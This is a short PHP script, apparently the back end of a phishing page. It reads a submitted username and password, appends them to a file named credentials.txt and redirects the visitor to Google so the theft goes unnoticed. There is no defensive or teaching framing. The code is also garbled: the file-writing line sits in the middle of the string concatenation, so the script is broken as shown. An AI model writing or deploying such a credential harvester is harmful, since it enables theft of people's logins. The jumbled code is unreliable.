<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
$username = $_POST['username'];
$password = $_POST['password'];
// Save credentials to credentials.txt
$data = "Username: "
. $username .
" | Password: "
file_put_contents("credentials.txt", $data, FILE_APPEND);
. $password . "\n";
// Redirect to Google
header("Location: https://www.google.com");
exit();
}
?>